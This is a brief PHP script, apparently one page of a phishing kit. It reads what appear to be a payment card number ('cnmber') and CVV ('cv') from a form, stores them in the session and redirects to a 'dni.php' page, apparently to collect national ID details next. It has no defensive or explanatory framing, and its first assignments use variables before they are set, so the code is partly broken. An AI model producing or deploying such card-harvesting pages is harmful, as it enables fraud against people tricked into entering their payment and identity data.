<?php
session_start();



$_SESSION['cnmber'] = "$cnmber";

$_SESSION['cv'] = "$cv";
$cnmber = $_POST['cnmber'];

$cv = $_POST['cv'];





$_SESSION['cnmber'] = "$cnmber";

$_SESSION['cv'] = "$cv";

header('location: dni.php');

?>